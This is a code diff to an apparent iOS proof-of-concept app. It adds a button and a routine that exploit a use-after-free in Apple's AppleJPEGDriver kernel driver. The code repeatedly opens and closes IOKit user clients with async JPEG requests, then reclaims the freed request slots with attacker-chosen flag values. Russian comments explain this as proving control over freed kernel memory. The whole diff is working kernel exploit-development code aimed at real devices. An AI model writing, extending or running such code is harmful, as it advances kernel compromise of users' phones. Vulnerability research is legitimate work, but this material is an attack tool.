@@ -121,6 +121,7 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
 @interface ViewController ()
 @property (nonatomic, strong) UITextView *logView;
 @property (nonatomic, strong) UIButton *panicButton;
+@property (nonatomic, strong) UIButton *rcButton;
 @property (nonatomic, strong) UILabel *statusLabel;
 @property (nonatomic, assign) BOOL running;
 @end
@@ -150,6 +151,17 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
     self.statusLabel.numberOfLines = 0;
     self.statusLabel.translatesAutoresizingMaskIntoConstraints = NO;
 
+    // RC button: controlled reclaim (progressive-flag oracle)
+    UIButton *rcButton = [UIButton buttonWithType:UIButtonTypeSystem];
+    [rcButton setTitle:@"RC: reclaim-ctrl" forState:UIControlStateNormal];
+    rcButton.titleLabel.font = [UIFont boldSystemFontOfSize:16];
+    rcButton.backgroundColor = [UIColor colorWithWhite:0.15 alpha:1.0];
+    rcButton.layer.cornerRadius = 10;
+    [rcButton setTitleColor:[UIColor systemGreenColor] forState:UIControlStateNormal];
+    rcButton.translatesAutoresizingMaskIntoConstraints = NO;
+    [rcButton addTarget:self action:@selector(triggerReclaimCtrl) forControlEvents:UIControlEventTouchUpInside];
+    self.rcButton = rcButton;
+
     // Hidden log view (still captures NSLog output for debugging)
     self.logView = [[UITextView alloc] init];
     self.logView.editable = NO;
@@ -163,6 +175,7 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
     [self.view addSubview:self.panicButton];
     [self.view addSubview:self.statusLabel];
     [self.view addSubview:self.logView];
+    [self.view addSubview:self.rcButton];
 
     UILayoutGuide *safe = self.view.safeAreaLayoutGuide;
     [NSLayoutConstraint activateConstraints:@[
@@ -177,6 +190,10 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
         [self.logView.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
         [self.logView.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
         [self.logView.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-12],
+        [self.rcButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-16],
+        [self.rcButton.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-16],
+        [self.rcButton.widthAnchor constraintEqualToConstant:150],
+        [self.rcButton.heightAnchor constraintEqualToConstant:44],
     ]];
 }
 
@@ -1452,4 +1469,161 @@ done:
     self.running = NO;
     });
 }
+
+#pragma mark - Path 3B controlled reclaim (progressive-flag oracle)
+
+// Идея: паника fullSpeedRequestExist читает [req+0x310] (progressive bit0).
+// Если victim submit с progressive=0, reclaim submit с progressive=1,
+// то freed-слот JpegRequest, переиспользованный reclaim-запросом, имеет бит0=1.
+// Обходчик очереди при чтении [req+0x310] пойдёт в ДРУГУЮ ветку (progressive).
+// Это докажет контролируемость содержимого freed-слота (vs случайный garbage).
+
+- (int)submitAsyncRequestsFlags:(io_connect_t)conn
+                    srcID:(uint32_t)srcID dstID:(uint32_t)dstID
+                    width:(uint32_t)W height:(uint32_t)H
+                    count:(int)N tokenBase:(uint64_t)tokenBase
+                    progressive:(BOOL)prog
+{
+    int submitted = 0;
+    for (int j = 0; j < N; j++) {
+        AppleJPEGDriverIOStruct input = {0};
+        AppleJPEGDriverIOStruct output = {0};
+        input.sourceID    = srcID;
+        input.field_04    = W * H;
+        input.destID      = dstID;
+        input.field_0C    = W * H * 4;
+        input.width       = W;
+        input.height      = H;
+        input.outWidth    = W;
+        input.outHeight   = H;
+        input.subsampling = 3;
+        input.asyncToken  = tokenBase + j;
+        input.flags       = prog ? 0x01 : 0x00;  // bit0 = progressive
+        size_t outSize = sizeof(output);
+        kern_return_t kr = IOConnectCallStructMethod(conn, 1,
+            &input, sizeof(input), &output, &outSize);
+        if (kr != KERN_SUCCESS) break;
+        submitted++;
+    }
+    return submitted;
+}
+
+- (void)triggerReclaimCtrl {
+    if (self.running) return;
+    self.running = YES;
+
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        [self log:@"=== ReclaimCtrl: progressive-flag oracle ==="];
+
+        io_service_t svc = [self findJPEGService];
+        if (!svc) { [self log:@"Service not found"]; self.running = NO; return; }
+
+        BOOL healthy = [self checkDriverHealth:svc];
+        [self log:@"Driver: %@", healthy ? @"OK" : @"BROKEN"];
+        if (!healthy) { IOObjectRelease(svc); self.running = NO; return; }
+
+        const uint32_t W = 2048, H = 2048;
+        NSData *jpegData = [self createTestJPEG:W height:H];
+
+        IOSurfaceRef vSrcSurf = [self createSourceSurface:jpegData];
+        IOSurfaceRef vDstSurf = [self createDestSurface:W height:H];
+        IOSurfaceRef rSrcSurf = [self createSourceSurface:jpegData];
+        IOSurfaceRef rDstSurf = [self createDestSurface:W height:H];
+        if (!vSrcSurf || !vDstSurf || !rSrcSurf || !rDstSurf) {
+            [self log:@"Surface creation failed"];
+            IOObjectRelease(svc);
+            self.running = NO;
+            return;
+        }
+        uint32_t vSrcID = IOSurfaceGetID(vSrcSurf);
+        uint32_t vDstID = IOSurfaceGetID(vDstSurf);
+        uint32_t rSrcID = IOSurfaceGetID(rSrcSurf);
+        uint32_t rDstID = IOSurfaceGetID(rDstSurf);
+        [self log:@"victim=%u/%u reclaim=%u/%u", vSrcID, vDstID, rSrcID, rDstID];
+
+        const int DOSE = 5;
+        const int R_CONNS = 3;
+        const int R_REQS = 3;
+        const int CYCLES = 60;
+
+        // Фаза A (контроль): victim(prog=0) + reclaim(prog=0) — ожидаем стабильность
+        [self log:@"A: victim(prog0) + reclaim(prog0), %d cycles", CYCLES];
+        int healthOK = 0, healthTotal = 0;
+        for (int c = 0; c < CYCLES && self.running; c++) {
+            io_connect_t vc = [self openUC:svc];
+            if (vc) {
+                [self submitAsyncRequestsFlags:vc srcID:vSrcID dstID:vDstID
+                    width:W height:H count:DOSE tokenBase:0xA000+c progressive:NO];
+                IOServiceClose(vc);
+            }
+            io_connect_t rConns[3]; int rcN = 0;
+            for (int r = 0; r < R_CONNS; r++) {
+                io_connect_t rc = [self openUC:svc];
+                if (!rc) continue;
+                [self submitAsyncRequestsFlags:rc srcID:rSrcID dstID:rDstID
+                    width:W height:H count:R_REQS tokenBase:0xC000+c*16+r progressive:NO];
+                rConns[rcN++] = rc;
+            }
+            io_connect_t tc = [self openUC:svc];
+            if (tc) {
+                [self submitAsyncRequestsFlags:tc srcID:rSrcID dstID:rDstID
+                    width:W height:H count:2 tokenBase:0xE000+c progressive:NO];
+                IOServiceClose(tc);
+            }
+            for (int r = 0; r < rcN; r++) IOServiceClose(rConns[r]);
+            if ((c+1) % 20 == 0) {
+                usleep(200000);
+                healthy = [self checkDriverHealth:svc];
+                healthTotal++;
+                if (healthy) healthOK++;
+                [self log:@"  [%d] health=%@", c+1, healthy?@"OK":@"BROKEN"];
+                if (!healthy) break;
+            }
+        }
+        [self log:@"A done: health %d/%d", healthOK, healthTotal];
+
+        // Фаза B (эксперимент): victim(prog=0) + reclaim(prog=1)
+        // Если содержимое freed-слота контролируемо, обходчик увидит prog=1
+        [self log:@"B: victim(prog0) + reclaim(prog1), %d cycles", CYCLES];
+        healthOK = 0; healthTotal = 0;
+        for (int c = 0; c < CYCLES && self.running; c++) {
+            io_connect_t vc = [self openUC:svc];
+            if (vc) {
+                [self submitAsyncRequestsFlags:vc srcID:vSrcID dstID:vDstID
+                    width:W height:H count:DOSE tokenBase:0xA000+c progressive:NO];
+                IOServiceClose(vc);
+            }
+            io_connect_t rConns[3]; int rcN = 0;
+            for (int r = 0; r < R_CONNS; r++) {
+                io_connect_t rc = [self openUC:svc];
+                if (!rc) continue;
+                [self submitAsyncRequestsFlags:rc srcID:rSrcID dstID:rDstID
+                    width:W height:H count:R_REQS tokenBase:0xC000+c*16+r progressive:YES];
+                rConns[rcN++] = rc;
+            }
+            io_connect_t tc = [self openUC:svc];
+            if (tc) {
+                [self submitAsyncRequestsFlags:tc srcID:rSrcID dstID:rDstID
+                    width:W height:H count:2 tokenBase:0xE000+c progressive:NO];
+                IOServiceClose(tc);
+            }
+            for (int r = 0; r < rcN; r++) IOServiceClose(rConns[r]);
+            if ((c+1) % 20 == 0) {
+                usleep(200000);
+                healthy = [self checkDriverHealth:svc];
+                healthTotal++;
+                if (healthy) healthOK++;
+                [self log:@"  [%d] health=%@", c+1, healthy?@"OK":@"BROKEN"];
+                if (!healthy) break;
+            }
+        }
+        [self log:@"B done: health %d/%d (if driver broke -> controlled UAF confirmed)", healthOK, healthTotal];
+
+        CFRelease(vSrcSurf); CFRelease(vDstSurf);
+        CFRelease(rSrcSurf); CFRelease(rDstSurf);
+        IOObjectRelease(svc);
+        self.running = NO;
+    });
+}
+
 @end
